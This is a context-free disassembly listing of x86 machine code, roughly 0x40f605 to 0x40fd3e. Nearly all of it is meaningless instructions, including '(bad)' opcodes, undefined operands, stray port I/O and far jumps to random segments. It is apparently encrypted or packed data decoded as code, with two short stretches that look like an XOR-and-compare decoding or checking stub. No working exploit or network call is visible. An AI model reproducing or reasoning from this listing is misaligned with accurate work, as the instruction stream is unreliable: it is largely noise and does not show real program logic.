  40f605:	loop   0x40f5ea
  40f607:	cmp    al,0x2c
  40f609:	call   0xeaa2:0x55099ef9
  40f610:	xchg   ebp,eax
  40f611:	loope  0x40f601
  40f613:	mov    ebp,edx
  40f615:	ins    DWORD PTR es:[edi],dx
  40f616:	mov    edi,0x806d0b42
  40f61b:	push   es
  40f61c:	jnp    0x40f5fe
  40f61e:	cmps   BYTE PTR cs:[si],BYTE PTR es:[di]
  40f621:	xchg   ebp,esp
  40f623:	pop    esp
  40f624:	xchg   BYTE PTR [ebx+ebx*2-0x1e],cl
  40f628:	in     eax,dx
  40f629:	lock and dl,dl
  40f62c:	sub    dh,BYTE PTR ds:0x6677247c
  40f632:	int    0xbe
  40f634:	je     0x40f665
  40f636:	sbb    esp,DWORD PTR [ecx-0x2f]
  40f639:	or     ebp,DWORD PTR [edi-0x3c]
  40f63c:	xor    al,0x1f
  40f63e:	cli    
  40f63f:	gs xor edi,eax
  40f642:	add    cl,BYTE PTR [edi-0x620794f8]
  40f648:	clc    
  40f649:	mov    ebp,0xfd5089bf
  40f64e:	js     0x40f5ee
  40f650:	inc    edx
  40f651:	pop    ds
  40f652:	mov    ebp,DWORD PTR [esi]
  40f654:	cs out dx,eax
  40f656:	pop    edx
  40f657:	mov    esp,0xb4618b64
  40f65c:	out    dx,eax
  40f65d:	and    BYTE PTR [esi-0x95c9860],ch
  40f663:	mov    ch,0xb
  40f665:	xor    dh,BYTE PTR [edi-0x34]
  40f668:	adc    eax,0xb2e67073
  40f66d:	sub    al,0xfb
  40f66f:	pushf  
  40f670:	mov    eax,ds:0x84636bf1
  40f675:	or     al,0x9b
  40f677:	mov    al,0x95
  40f679:	das    
  40f67a:	retf   
  40f67b:	and    BYTE PTR [esi],dl
  40f67d:	fnstenv [eax+0x42]
  40f680:	mov    ds:0x3ac1ee71,al
  40f685:	test   DWORD PTR es:[eax-0x69fb52e5],esp
  40f68c:	dec    ecx
  40f68d:	popf   
  40f68e:	mov    ch,BYTE PTR [ebx+edi*4+0x7579b9f5]
  40f695:	add    edi,DWORD PTR [ebx+0xf]
  40f698:	je     0x40f703
  40f69a:	push   esi
  40f69b:	push   ss
  40f69c:	push   esp
  40f69d:	xor    al,0x36
  40f69f:	ins    BYTE PTR es:[edi],dx
  40f6a0:	rcl    ecx,1
  40f6a2:	cmc    
  40f6a3:	gs mov cl,0xb0
  40f6a6:	jae    0x40f6a6
  40f6a8:	ds inc eax
  40f6aa:	ds pop esi
  40f6ac:	cmp    dh,al
  40f6ae:	xor    DWORD PTR [esi+0x15],ebp
  40f6b1:	jo     0x40f701
  40f6b3:	mov    esp,0x7403f84f
  40f6b8:	rcl    DWORD PTR [edx-0x2],cl
  40f6bb:	cld    
  40f6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6bd:	(bad)  
  40f6bf:	aam    0x73
  40f6c1:	mov    dh,0x7f
  40f6c3:	jb     0x40f650
  40f6c5:	mov    edi,0xf229ba8b
  40f6ca:	mov    edx,0x31ab9603
  40f6cf:	and    BYTE PTR [esi],0xd9
  40f6d2:	stc    
  40f6d3:	inc    esp
  40f6d4:	clc    
  40f6d5:	repnz add DWORD PTR [esi+eax*4-0x1cbab72f],ecx
  40f6dd:	out    dx,eax
  40f6de:	xor    eax,0x715eb72f
  40f6e3:	fist   DWORD PTR [esi+0x5e2d11cb]
  40f6e9:	fwait
  40f6ea:	jge    0x40f768
  40f6ec:	push   es
  40f6ed:	lods   eax,DWORD PTR ds:[esi]
  40f6ee:	cs scas al,BYTE PTR es:[edi]
  40f6f0:	pop    eax
  40f6f1:	sub    DWORD PTR [eax+0x5e5d355c],ecx
  40f6f7:	or     dl,BYTE PTR [edi-0x286f4e4a]
  40f6fd:	sbb    eax,0x49f5b933
  40f702:	mov    ah,0xa6
  40f704:	aas    
  40f705:	pop    edi
  40f706:	push   edx
  40f707:	daa    
  40f708:	add    ax,0xef02
  40f70c:	(bad)  
  40f70d:	mov    dh,0xdb
  40f70f:	xlat   BYTE PTR ds:[ebx]
  40f710:	test   al,0xee
  40f712:	lock aaa 
  40f714:	test   al,0x81
  40f716:	hlt    
  40f717:	(bad)  
  40f718:	iret   
  40f719:	mul    DWORD PTR ds:[ebx-0xd4b8629]
  40f720:	cmp    DWORD PTR [ecx+0x568b068b],ebx
  40f726:	add    al,0xf
  40f728:	lods   al,BYTE PTR ds:[esi]
  40f729:	rol    BYTE PTR [edx],1
  40f72b:	mov    DWORD PTR [ebp+0x14],eax
  40f72e:	mov    eax,DWORD PTR [esi]
  40f730:	xor    DWORD PTR [ebp+0x14],edi
  40f733:	shr    edx,0x2
  40f736:	mov    edx,DWORD PTR [esi+0x4]
  40f739:	jmp    0x40fcc3
  40f73e:	inc    edx
  40f73f:	jecxz  0x40f7be
  40f741:	sbb    bl,BYTE PTR [eax+ebx*1]
  40f744:	sub    bl,dl
  40f746:	mov    esi,0xd1b40793
  40f74b:	lods   al,BYTE PTR ds:[esi]
  40f74c:	jp     0x40f6fc
  40f74e:	loop   0x40f7c4
  40f750:	push   ss
  40f751:	push   ss
  40f752:	cmp    eax,0xf0161604
  40f757:	pop    ebx
  40f758:	jle    0x40f791
  40f75a:	jp     0x40f6e6
  40f75c:	xchg   esp,eax
  40f75d:	or     BYTE PTR [eax-0x50],bh
  40f760:	mov    edi,edi
  40f762:	xchg   BYTE PTR [ebp+0x7a],ch
  40f765:	and    al,0x9b
  40f767:	(bad)  
  40f768:	outs   dx,DWORD PTR ds:[esi]
  40f769:	xchg   esp,edx
  40f76b:	cmp    DWORD PTR [esi],ecx
  40f76d:	jbe    0x40f783
  40f76f:	fimul  DWORD PTR [edx-0x73bbabc7]
  40f775:	lds    ebp,FWORD PTR [edi-0x5d]
  40f778:	mov    dl,0xee
  40f77a:	cmp    al,BYTE PTR [ebx-0x6c]
  40f77d:	jecxz  0x40f752
  40f77f:	(bad)  
  40f780:	sub    al,0xce
  40f782:	pop    ss
  40f783:	mov    esp,0xfd408ef
  40f788:	inc    ebp
  40f789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f78a:	test   DWORD PTR [ebp-0x18],0x523dd103
  40f791:	push   es
  40f792:	mov    BYTE PTR ds:[edi+0x40],dl
  40f796:	(bad)  
  40f797:	into   
  40f798:	sub    ah,dl
  40f79a:	fmulp  st(1),st
  40f79c:	cdq    
  40f79d:	bound  ecx,QWORD PTR ds:0x7e0e6849
  40f7a3:	mov    al,0x9f
  40f7a5:	fimul  DWORD PTR [edi-0x5add147b]
  40f7ab:	jb     0x40f79c
  40f7ad:	sub    al,0xc2
  40f7af:	icebp  
  40f7b0:	or     al,0x47
  40f7b2:	or     eax,0xcf89dbb8
  40f7b7:	sbb    ebp,0x30
  40f7ba:	pop    ebx
  40f7bb:	mov    al,0x4d
  40f7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7be:	and    eax,0x76ff3f15
  40f7c3:	push   esi
  40f7c4:	out    0x99,eax
  40f7c6:	test   DWORD PTR [edx],esp
  40f7c8:	cmp    DWORD PTR [edi],edx
  40f7ca:	push   ss
  40f7cb:	pop    edi
  40f7cc:	mov    edi,0x5b11a27d
  40f7d1:	push   esp
  40f7d2:	inc    edx
  40f7d3:	(bad)  
  40f7d4:	lods   eax,DWORD PTR ds:[esi]
  40f7d5:	pop    es
  40f7d6:	stos   BYTE PTR es:[edi],al
  40f7d7:	pop    eax
  40f7d8:	rcr    BYTE PTR [ebp+0xd],1
  40f7db:	stos   DWORD PTR es:[edi],eax
  40f7dc:	sti    
  40f7dd:	add    al,0x5c
  40f7df:	fcom   DWORD PTR [esi-0xb4e812f]
  40f7e5:	lea    edi,[ecx]
  40f7e7:	mov    dl,0x5d
  40f7e9:	lock pop esi
  40f7eb:	shl    DWORD PTR [esi+esi*2],cl
  40f7ee:	xchg   edx,eax
  40f7ef:	ds mov dl,0x3b
  40f7f2:	cmc    
  40f7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7f4:	(bad)  
  40f7f5:	rcl    DWORD PTR [edx+0x46],cl
  40f7f8:	jmp    0x40f86a
  40f7fa:	(bad)  
  40f7fb:	ret    0x7de3
  40f7fe:	and    bl,dl
  40f800:	dec    esp
  40f801:	push   edi
  40f802:	push   0xffffffff
  40f804:	adc    eax,0xca826538
  40f809:	jmp    0xc011:0x37b41808
  40f810:	iret   
  40f811:	inc    edi
  40f812:	imul   ebx,DWORD PTR ds:0x10c9123,0x59
  40f819:	inc    edi
  40f81a:	loope  0x40f861
  40f81c:	add    BYTE PTR [eax+0x15],ch
  40f81f:	arpl   WORD PTR [edx+0x38],cx
  40f822:	out    dx,al
  40f823:	sub    DWORD PTR es:[ebx-0xccfc8b0],esp
  40f82a:	aam    0x99
  40f82c:	jmp    0xbb09:0x35067314
  40f833:	push   ecx
  40f834:	push   ecx
  40f835:	mov    ah,0x32
  40f837:	lock aas 
  40f839:	test   eax,0xc4e7927c
  40f83e:	ins    DWORD PTR es:[edi],dx
  40f83f:	sbb    eax,0xf4795263
  40f844:	jno    0x40f83a
  40f846:	int    0xf2
  40f848:	mov    ds:0x109eb542,eax
  40f84d:	or     ebx,DWORD PTR [edi]
  40f84f:	bound  ebp,QWORD PTR [edi+esi*2]
  40f852:	xor    bh,BYTE PTR ds:[ebx-0x23]
  40f856:	fisubr WORD PTR [esi+0xb]
  40f859:	stos   BYTE PTR es:[edi],al
  40f85a:	cdq    
  40f85b:	clc    
  40f85c:	push   ecx
  40f85d:	or     BYTE PTR [eax],dl
  40f85f:	jl     0x40f8af
  40f861:	in     al,0x2a
  40f863:	pop    edx
  40f864:	or     eax,0x7576f994
  40f869:	sub    BYTE PTR [ecx-0x4a552b0c],dl
  40f86f:	xchg   esp,eax
  40f870:	fld    TBYTE PTR [ebp-0x4a]
  40f873:	cs cwde 
  40f875:	in     eax,0xc1
  40f877:	ror    BYTE PTR [ebp-0x30],0xb2
  40f87b:	enter  0x664a,0xaa
  40f87f:	and    al,0xd
  40f881:	sar    DWORD PTR [ecx-0x9f301f4],0xe0
  40f888:	outs   dx,DWORD PTR ds:[esi]
  40f889:	push   edx
  40f88a:	fnstcw WORD PTR [edx-0x6a]
  40f88d:	push   ebx
  40f88e:	mov    ebp,0x61afad59
  40f893:	add    dl,BYTE PTR [edi-0x169433a4]
  40f899:	add    DWORD PTR [ebx+0x8],ebx
  40f89c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f89d:	mov    ds:0x4e9def8e,al
  40f8a2:	inc    edi
  40f8a3:	shl    DWORD PTR [edx],1
  40f8a5:	arpl   WORD PTR [esp+edi*4],ax
  40f8a8:	fsubr  DWORD PTR [ecx-0x4f]
  40f8ab:	xchg   esp,eax
  40f8ac:	mov    ?,WORD PTR [esi-0x47]
  40f8af:	inc    edi
  40f8b0:	(bad)  [edi-0x1]
  40f8b3:	mov    cl,0x20
  40f8b5:	inc    esp
  40f8b6:	das    
  40f8b7:	in     al,dx
  40f8b8:	mov    al,0xd7
  40f8ba:	rcl    BYTE PTR [ebx-0x6d],0xdd
  40f8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8bf:	and    eax,0xc0974936
  40f8c4:	push   es
  40f8c5:	push   edi
  40f8c6:	js     0x40f8de
  40f8c8:	int    0x56
  40f8ca:	popf   
  40f8cb:	sbb    al,0x29
  40f8cd:	mov    fs,ebx
  40f8cf:	fwait
  40f8d0:	pop    edi
  40f8d1:	rcl    DWORD PTR [ebx+ebx*8],cl
  40f8d4:	xor    bh,BYTE PTR [eax+0xf]
  40f8d7:	aas    
  40f8d8:	ss jge 0x40f8d4
  40f8db:	mov    edi,0xbce1e75c
  40f8e0:	cwde   
  40f8e1:	pop    ds
  40f8e2:	jl     0x40f92d
  40f8e4:	repz sub dl,BYTE PTR [ecx]
  40f8e7:	jbe    0x40f8bf
  40f8e9:	inc    esp
  40f8ea:	or     ebp,DWORD PTR [ecx]
  40f8ec:	call   0x71e7f30
  40f8f1:	int3   
  40f8f2:	mov    bh,0xdb
  40f8f4:	mov    WORD PTR [ebx],es
  40f8f6:	sub    al,0x19
  40f8f8:	int3   
  40f8f9:	mov    DWORD PTR [esi+0x5a],edx
  40f8fc:	lds    ebx,FWORD PTR [eax+esi*8-0x4d00e525]
  40f903:	push   eax
  40f904:	fnstenv [eax+0x38]
  40f907:	mov    eax,0xa42621a7
  40f90c:	dec    esp
  40f90d:	aam    0xe7
  40f90f:	lods   eax,DWORD PTR ds:[esi]
  40f910:	xchg   esi,eax
  40f911:	sub    edx,edi
  40f913:	mov    edi,0xd76e5b4d
  40f918:	leave  
  40f919:	fild   QWORD PTR [edx]
  40f91b:	stos   DWORD PTR es:[edi],eax
  40f91c:	dec    ebp
  40f91d:	cs mov edx,0x203f00ae
  40f923:	mov    eax,0x10282610
  40f928:	int    0x90
  40f92a:	enter  0x733a,0x66
  40f92e:	aas    
  40f92f:	and    al,BYTE PTR [esi+0x4c39dd62]
  40f935:	push   es
  40f936:	addr16 push cs
  40f938:	(bad)  
  40f939:	out    0xd3,al
  40f93b:	retf   
  40f93c:	xor    cl,BYTE PTR [ebx-0x7e8bba3d]
  40f942:	in     al,0x3b
  40f944:	dec    edx
  40f945:	xchg   ecx,eax
  40f946:	lods   al,BYTE PTR ds:[esi]
  40f947:	cmp    al,ch
  40f949:	inc    eax
  40f94a:	add    dh,BYTE PTR [edx]
  40f94c:	outs   dx,DWORD PTR ds:[esi]
  40f94d:	out    0xab,eax
  40f94f:	or     DWORD PTR [esi-0x535047a2],ebp
  40f955:	stos   DWORD PTR es:[edi],eax
  40f956:	ins    BYTE PTR es:[edi],dx
  40f957:	fcomp  QWORD PTR [ebx]
  40f959:	push   ss
  40f95a:	dec    ebx
  40f95b:	push   eax
  40f95c:	add    al,0xd
  40f95e:	ror    BYTE PTR [esi+ebp*4],0x50
  40f962:	es out 0x5f,al
  40f965:	xchg   DWORD PTR [ebp+edi*4-0x1f9e6fcf],ecx
  40f96c:	ret    0xf9de
  40f96f:	loopne 0x40f960
  40f971:	mov    dl,0xc
  40f973:	cmp    ch,BYTE PTR [ecx+0x338f6057]
  40f979:	loopne 0x40f9c1
  40f97b:	adc    eax,0xdb4c835e
  40f980:	mov    dl,0x2b
  40f982:	int3   
  40f983:	add    ch,0xf1
  40f986:	xor    BYTE PTR [eax],cl
  40f988:	fcomp  DWORD PTR ds:0x3195c700
  40f98e:	jae    0x40f918
  40f990:	lahf   
  40f991:	mov    ds:0x2eacd024,eax
  40f996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f997:	sbb    eax,0x9c206c57
  40f99c:	sub    BYTE PTR [edi+0x7db3d273],cl
  40f9a2:	es out 0xf3,eax
  40f9a5:	cli    
  40f9a6:	loopne 0x40fa23
  40f9a8:	jp     0x40f943
  40f9aa:	sbb    eax,0x9f363e0f
  40f9af:	pop    ds
  40f9b0:	hlt    
  40f9b1:	add    al,0xdb
  40f9b3:	into   
  40f9b4:	arpl   WORD PTR es:[edx+0x64],si
  40f9b8:	cmp    bh,al
  40f9ba:	stos   BYTE PTR es:[edi],al
  40f9bb:	xor    BYTE PTR [eax-0x5a32d830],dh
  40f9c1:	add    eax,0xe5f113f0
  40f9c6:	sub    BYTE PTR [ebx],bh
  40f9c8:	push   edi
  40f9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ca:	cld    
  40f9cb:	sbb    eax,0xe946aadc
  40f9d0:	jle    0x40fa07
  40f9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d3:	arpl   cx,sp
  40f9d5:	xchg   DWORD PTR [edi],edi
  40f9d7:	sar    BYTE PTR [ecx-0x763772c7],1
  40f9dd:	outs   dx,BYTE PTR ds:[esi]
  40f9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9df:	inc    esi
  40f9e0:	test   bl,dl
  40f9e2:	out    0x6c,eax
  40f9e4:	idiv   BYTE PTR [ecx+0x6a78dc46]
  40f9ea:	iret   
  40f9eb:	lods   al,BYTE PTR ds:[esi]
  40f9ec:	retf   0xaa2e
  40f9ef:	sub    al,0xdb
  40f9f1:	in     eax,dx
  40f9f2:	not    eax
  40f9f4:	(bad)  
  40f9f5:	bnd jne 0x40fa47
  40f9f8:	xchg   ebp,eax
  40f9f9:	pop    edi
  40f9fa:	pop    es
  40f9fb:	lds    esi,FWORD PTR [ecx]
  40f9fd:	(bad)  
  40f9ff:	scas   al,BYTE PTR es:[edi]
  40fa00:	pop    es
  40fa01:	adc    al,BYTE PTR [ebx+0x29d2c582]
  40fa07:	test   BYTE PTR [eax+0x5f],ch
  40fa0a:	jmp    0xf5cb:0xf4bb9f79
  40fa11:	stos   DWORD PTR es:[edi],eax
  40fa12:	or     ah,BYTE PTR [edx+eiz*1-0x218da28]
  40fa19:	adc    ebx,DWORD PTR [edx+0x55]
  40fa1c:	sub    BYTE PTR [ecx+0x69],bl
  40fa1f:	sbb    edi,DWORD PTR ds:0x8cda82f6
  40fa25:	and    al,0xaf
  40fa27:	mov    ecx,DWORD PTR [ecx+0x29]
  40fa2a:	cwde   
  40fa2b:	push   0x1b2c49b1
  40fa30:	out    0x13,al
  40fa32:	jno    0x40fa8c
  40fa34:	add    eax,DWORD PTR [edi]
  40fa36:	inc    esi
  40fa37:	sub    al,0x77
  40fa39:	out    dx,al
  40fa3a:	sbb    eax,0x985b8d13
  40fa3f:	cdq    
  40fa40:	into   
  40fa41:	ds and ah,dl
  40fa44:	adc    eax,0x95c332e2
  40fa49:	push   ecx
  40fa4a:	out    dx,eax
  40fa4b:	pop    edx
  40fa4c:	ds stc 
  40fa4e:	cdq    
  40fa4f:	(bad)  
  40fa51:	adc    DWORD PTR [edx-0x30a2832e],eax
  40fa57:	or     BYTE PTR [ebp-0x5dee3395],bh
  40fa5d:	daa    
  40fa5e:	push   ebp
  40fa5f:	pop    edx
  40fa60:	int    0x87
  40fa62:	and    eax,0x9474d5bf
  40fa67:	shr    esi,cl
  40fa69:	push   ss
  40fa6a:	mov    cl,0x78
  40fa6c:	jo     0x40fa3f
  40fa6e:	push   ebp
  40fa6f:	mov    cl,0xe6
  40fa71:	call   0xe4c7:0xcc0e3bc
  40fa78:	push   cs
  40fa79:	mov    al,ds:0x4163976e
  40fa7e:	call   0x81c2:0xee22db05
  40fa85:	outs   dx,BYTE PTR ds:[esi]
  40fa86:	ss xchg edx,eax
  40fa88:	and    al,0xc1
  40fa8a:	ss pop ebp
  40fa8c:	fld    QWORD PTR [edi-0x276509a7]
  40fa92:	scas   eax,DWORD PTR es:[edi]
  40fa93:	test   al,0x75
  40fa95:	mov    eax,ebx
  40fa97:	pop    ss
  40fa98:	or     al,0xda
  40fa9a:	addr16 push edi
  40fa9c:	mov    edx,0x471b123f
  40faa1:	test   eax,0x23758500
  40faa6:	sbb    al,0x31
  40faa8:	in     al,0x9f
  40faaa:	jae    0x40fa78
  40faac:	test   al,0xeb
  40faae:	mov    ss,WORD PTR [ebx+0x7c]
  40fab1:	xchg   ebx,eax
  40fab2:	fsubr  QWORD PTR [eax-0x78]
  40fab5:	dec    ebp
  40fab6:	test   al,0xc6
  40fab8:	mov    ecx,0x749546c8
  40fabd:	clc    
  40fabe:	mov    esp,0x3de8cc06
  40fac3:	and    BYTE PTR [eax],dh
  40fac5:	inc    esi
  40fac6:	in     eax,dx
  40fac7:	xor    edx,ebp
  40fac9:	xor    BYTE PTR [edx+0x61],bl
  40facc:	push   eax
  40facd:	jnp    0x40fafb
  40facf:	xchg   esp,eax
  40fad0:	push   0x7d
  40fad2:	mov    edi,0xcb485f62
  40fad7:	ja     0x40fb0d
  40fad9:	loope  0x40fafd
  40fadb:	push   edx
  40fadc:	inc    edi
  40fadd:	xchg   ebp,eax
  40fade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fadf:	es inc edi
  40fae2:	test   dh,dh
  40fae4:	pushf  
  40fae5:	js     0x40fadf
  40fae7:	pop    ebx
  40fae8:	nop
  40fae9:	clc    
  40faea:	dec    eax
  40faeb:	pop    ds
  40faec:	dec    eax
  40faed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faee:	(bad)  
  40faef:	pushf  
  40faf0:	adc    cl,BYTE PTR [edi]
  40faf2:	je     0x40fa86
  40faf4:	outs   dx,BYTE PTR ds:[esi]
  40faf5:	jp     0x40fa80
  40faf7:	xchg   BYTE PTR [ebp+0x27d591a3],al
  40fafd:	lahf   
  40fafe:	push   cs
  40faff:	push   0x633eb0c0
  40fb04:	test   BYTE PTR [ecx+0x19423c4],ah
  40fb0a:	repz pop ebx
  40fb0c:	mov    al,0x2c
  40fb0e:	mov    dh,0xc2
  40fb10:	add    dl,al
  40fb12:	mov    ds:0xbeda30f2,eax
  40fb17:	fist   DWORD PTR [ebx]
  40fb19:	in     al,0x1f
  40fb1b:	cmp    DWORD PTR [esi+0x64a16808],edx
  40fb21:	cmp    ebx,DWORD PTR [esp+edi*4]
  40fb24:	call   0xfd84:0xb100342
  40fb2b:	jle    0x40fb62
  40fb2d:	in     al,dx
  40fb2e:	pop    es
  40fb2f:	out    0x11,eax
  40fb31:	dec    ebp
  40fb32:	dec    esp
  40fb33:	push   esi
  40fb34:	out    dx,al
  40fb35:	call   0xb4da:0xf08f3d72
  40fb3c:	into   
  40fb3d:	adc    eax,DWORD PTR [ebp+0x60]
  40fb40:	fadd   DWORD PTR [ecx]
  40fb42:	add    BYTE PTR [eax],dl
  40fb44:	mov    ah,0x3b
  40fb46:	pop    ecx
  40fb47:	aad    0xb1
  40fb49:	fsubr  st(7),st
  40fb4b:	mov    ds:0xd8b6ec25,al
  40fb50:	push   edx
  40fb51:	lea    edi,[esi]
  40fb53:	xchg   DWORD PTR [esi],esp
  40fb55:	pop    esi
  40fb56:	xchg   ebx,eax
  40fb57:	dec    esp
  40fb58:	mov    ds:0x25dbe8f,eax
  40fb5d:	sar    BYTE PTR [edi+0x21eba0b9],0x26
  40fb64:	into   
  40fb65:	pop    eax
  40fb66:	dec    ebx
  40fb67:	jp     0x40fafd
  40fb69:	xor    dl,BYTE PTR [ebx]
  40fb6b:	dec    edi
  40fb6c:	mov    ds:0x1b99b4e0,eax
  40fb71:	xlat   BYTE PTR ds:[ebx]
  40fb72:	pop    esp
  40fb73:	mov    al,ds:0x7a552d91
  40fb78:	adc    eax,0x6078ca5d
  40fb7d:	push   0x1fe4e6df
  40fb82:	fnstsw WORD PTR [eax-0x2f]
  40fb85:	iret   
  40fb86:	dec    ebp
  40fb87:	out    0xd9,al
  40fb89:	sbb    edi,eax
  40fb8b:	int3   
  40fb8c:	cmp    DWORD PTR [ebp+ebp*1+0x33],edi
  40fb90:	test   BYTE PTR [edx],ch
  40fb92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb93:	ss pushf 
  40fb95:	push   eax
  40fb96:	out    dx,eax
  40fb97:	pop    eax
  40fb98:	retf   
  40fb99:	pop    esp
  40fb9a:	push   esp
  40fb9b:	cs dec edx
  40fb9d:	pushf  
  40fb9e:	cs add eax,0x1419189c
  40fba4:	dec    DWORD PTR [ebp-0x162d2801]
  40fbaa:	lahf   
  40fbab:	aaa    
  40fbac:	adc    BYTE PTR [edi+0x376a8b9f],dh
  40fbb2:	inc    ecx
  40fbb3:	mov    ?,WORD PTR [ecx]
  40fbb5:	lock sbb eax,0x4adf1280
  40fbbb:	sti    
  40fbbc:	mov    edi,0x841d0035
  40fbc1:	jns    0x40fb5b
  40fbc3:	aaa    
  40fbc4:	(bad)  
  40fbc5:	jp     0x40fb64
  40fbc7:	fnstenv [ebx]
  40fbc9:	adc    ebx,DWORD PTR [ebx-0x3aa044bc]
  40fbcf:	jb     0x40fc24
  40fbd1:	fadd   st(3),st
  40fbd3:	jae    0x40fc11
  40fbd5:	sbb    ch,BYTE PTR [ebx]
  40fbd7:	sbb    DWORD PTR [ebp+0x9e90f0a],0x2f
  40fbde:	mov    edx,DWORD PTR [edi+0xc592ab5]
  40fbe4:	mov    ecx,0xdc8e9729
  40fbe9:	cli    
  40fbea:	add    ebx,DWORD PTR [ebx+0x25f0dec1]
  40fbf0:	(bad)  [esi-0x3f]
  40fbf3:	fld    TBYTE PTR [ecx+0x6f]
  40fbf6:	add    ebp,edx
  40fbf8:	loopne 0x40fc5a
  40fbfa:	cld    
  40fbfb:	ins    DWORD PTR es:[edi],dx
  40fbfc:	daa    
  40fbfd:	cdq    
  40fbfe:	dec    ecx
  40fbff:	mov    al,0xef
  40fc01:	inc    esp
  40fc02:	add    bl,dh
  40fc04:	mov    dl,0x79
  40fc06:	pop    ebp
  40fc07:	dec    esp
  40fc08:	mov    WORD PTR [ecx-0x35],?
  40fc0b:	sbb    bh,0x44
  40fc0e:	call   0xfb51f0cf
  40fc13:	and    ch,ah
  40fc15:	dec    ebx
  40fc16:	sub    al,ch
  40fc18:	jo     0x40fc32
  40fc1a:	sti    
  40fc1b:	mov    cl,bl
  40fc1d:	ins    DWORD PTR es:[edi],dx
  40fc1e:	stos   DWORD PTR es:[edi],eax
  40fc1f:	cwde   
  40fc20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc21:	push   edi
  40fc22:	scas   eax,DWORD PTR es:[edi]
  40fc23:	push   ecx
  40fc24:	retf   0xf36a
  40fc27:	mov    BYTE PTR [ebx+0x5eca2ea2],bl
  40fc2d:	mov    ecx,0x8cae3baf
  40fc32:	es (bad) 
  40fc34:	out    dx,al
  40fc35:	xchg   ebx,eax
  40fc36:	cdq    
  40fc37:	sub    dh,BYTE PTR [edi-0x25]
  40fc3a:	test   DWORD PTR [ebx+0x25],ebx
  40fc3d:	lock out dx,al
  40fc3f:	pop    es
  40fc40:	jle    0x40fcb7
  40fc42:	jg     0x40fc04
  40fc44:	inc    esi
  40fc45:	lea    ebx,[edx+0x4]
  40fc48:	mov    eax,0xa9205973
  40fc4d:	jp     0x40fc59
  40fc4f:	out    dx,al
  40fc50:	lea    edx,[eax+0x1c26e19a]
  40fc56:	dec    eax
  40fc57:	xchg   ecx,eax
  40fc58:	push   esi
  40fc59:	or     ebp,DWORD PTR [ebx-0x73]
  40fc5c:	scas   al,BYTE PTR es:[edi]
  40fc5d:	xchg   BYTE PTR [ebp-0x5aeed173],ch
  40fc63:	or     eax,0x74ccd6dd
  40fc68:	in     eax,0x60
  40fc6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc6b:	sahf   
  40fc6c:	int3   
  40fc6d:	mov    cl,0x48
  40fc6f:	popa   
  40fc70:	cli    
  40fc71:	xor    al,0xa8
  40fc73:	cli    
  40fc74:	por    mm7,QWORD PTR cs:[edx-0x2e527d61]
  40fc7c:	inc    esp
  40fc7d:	sbb    ecx,edi
  40fc7f:	jnp    0x40fcab
  40fc81:	cmp    bh,BYTE PTR [eax+0x6f492ffb]
  40fc87:	jmp    0xff1d:0xd3ddf156
  40fc8e:	xchg   esi,eax
  40fc8f:	ret    
  40fc90:	inc    ecx
  40fc91:	jnp    0x40fd0d
  40fc93:	mov    edx,0xb657b547
  40fc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc99:	push   ds
  40fc9a:	cwde   
  40fc9b:	imul   ebx,esi,0x7563b0f0
  40fca1:	inc    edx
  40fca2:	jmp    0x1679efe0
  40fca7:	loope  0x40fcd5
  40fca9:	and    dh,ch
  40fcab:	pop    es
  40fcac:	xor    eax,0x91756981
  40fcb1:	or     DWORD PTR [esi],ebp
  40fcb3:	imul   edx,DWORD PTR [edi],0xe54bfb9
  40fcb9:	xchg   dh,cl
  40fcbb:	fcomp  QWORD PTR [edi-0x2a]
  40fcbe:	cmp    eax,0xee3bd92c
  40fcc3:	xor    edx,edx
  40fcc5:	shl    eax,0x1e
  40fcc8:	or     edx,DWORD PTR [ebp+0x14]
  40fccb:	mov    DWORD PTR [ebp-0x28],edx
  40fcce:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd1:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd4:	xor    edx,edx
  40fcd6:	shld   edx,eax,0x2
  40fcda:	xor    edx,ecx
  40fcdc:	mov    DWORD PTR [ebp+0xc],edx
  40fcdf:	mov    edx,DWORD PTR [esi]
  40fce1:	shl    eax,0x2
  40fce4:	mov    DWORD PTR [ebp+0x10],edx
  40fce7:	mov    edx,DWORD PTR [esi+0x4]
  40fcea:	xor    eax,0xba699573
  40fcef:	mov    DWORD PTR [ebp+0x14],edx
  40fcf2:	cmp    eax,DWORD PTR [ebp+0x10]
  40fcf5:	jne    0x41195a
  40fcfb:	jmp    0x410285
  40fd00:	shl    BYTE PTR [eax-0x5b],0xd6
  40fd04:	and    eax,0x48609832
  40fd09:	and    dl,ah
  40fd0b:	test   al,0xcf
  40fd0d:	pop    ebp
  40fd0e:	bound  esi,QWORD PTR [edx+0x18]
  40fd11:	push   0x16
  40fd13:	push   ss
  40fd14:	cmp    eax,0xf2161604
  40fd19:	sbb    bl,BYTE PTR [eax+0x2cca7ce6]
  40fd1f:	ret    
  40fd20:	pop    es
  40fd21:	mov    ebx,DWORD PTR [ecx]
  40fd23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd24:	push   ss
  40fd25:	es fadd st(5),st
  40fd28:	cdq    
  40fd29:	sub    ah,al
  40fd2b:	leave  
  40fd2c:	jns    0x40fcbf
  40fd2e:	addr16 jl 0x40fce2
  40fd31:	loope  0x40fd5f
  40fd33:	cmp    eax,0xd50da3c0
  40fd38:	rol    esi,0x43
  40fd3b:	dec    ebp
  40fd3c:	xchg   ecx,eax
  40fd3d:	scas   eax,DWORD PTR es:[edi]
  40fd3e:	stos   DWORD PTR es:[edi],eax
